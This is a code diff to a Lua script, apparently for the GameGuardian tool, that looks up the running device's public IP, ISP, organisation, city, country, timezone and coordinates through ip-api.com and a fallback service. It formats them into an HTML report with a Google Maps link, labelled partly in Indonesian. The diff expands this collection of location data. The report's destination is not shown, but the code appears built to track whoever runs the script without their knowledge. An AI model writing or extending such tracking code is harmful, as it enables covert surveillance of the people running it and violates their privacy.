@@ -60,7 +60,7 @@ local function get_location()
 
     -- Primary Provider: ip-api.com
     local function fetch_ip_api()
-        local url = "http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query"
+        local url = "http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,org,timezone,query"
         local response = gg.makeRequest(url)
         if not response or response.code ~= 200 then return nil end
 
@@ -70,14 +70,16 @@ local function get_location()
         end
         if lines[1] ~= "success" then return nil end
         return {
-            country = lines[2],
-            region  = lines[3],
-            city    = lines[4],
-            lat     = lines[5],
-            lon     = lines[6],
-            isp     = lines[7],
-            ip      = lines[8],
-            type    = "IP (Estimate)"
+            country  = lines[2],
+            region   = lines[3],
+            city     = lines[4],
+            lat      = lines[5],
+            lon      = lines[6],
+            isp      = lines[7],
+            org      = lines[8],
+            timezone = lines[9],
+            ip       = lines[10],
+            type     = "IP (Estimate)"
         }
     end
 
@@ -94,14 +96,16 @@ local function get_location()
 
         if #parts < 11 then return nil end
         return {
-            ip      = parts[1],
-            city    = parts[2],
-            region  = parts[3],
-            country = parts[6],
-            lat     = parts[10],
-            lon     = parts[11],
-            isp     = parts[18] or "Unknown",
-            type    = "IP (Fallback)"
+            ip       = parts[1],
+            city     = parts[2],
+            region   = parts[3],
+            country  = parts[6],
+            lat      = parts[10],
+            lon      = parts[11],
+            timezone = parts[12],
+            isp      = parts[18] or "Unknown",
+            org      = parts[18] or "Unknown",
+            type     = "IP (Fallback)"
         }
     end
 
@@ -138,8 +142,10 @@ local function send_report()
     if ip_loc then
         message = message .. "<b>🌐 IP ADDR  :</b> <code>" .. ip_loc.ip .. "</code>\n" ..
                     "<b>🏢 ISP      :</b> <code>" .. ip_loc.isp .. "</code>\n" ..
+                    "<b>🏢 ORG      :</b> <code>" .. (ip_loc.org or "Unknown") .. "</code>\n" ..
                     "<b>🏙️ KOTA     :</b> <code>" .. ip_loc.city .. "</code>\n" ..
                     "<b>🇮🇩 NEGARA   :</b> <code>" .. ip_loc.country .. "</code>\n" ..
+                    "<b>🕒 TIMEZONE :</b> <code>" .. (ip_loc.timezone or "Unknown") .. "</code>\n" ..
                     "📍 <a href=\"https://www.google.com/maps?q=" .. ip_loc.lat .. "," .. ip_loc.lon .. "\"><b>Lihat Estimasi IP</b></a>\n" ..
                     line .. "\n"
     else
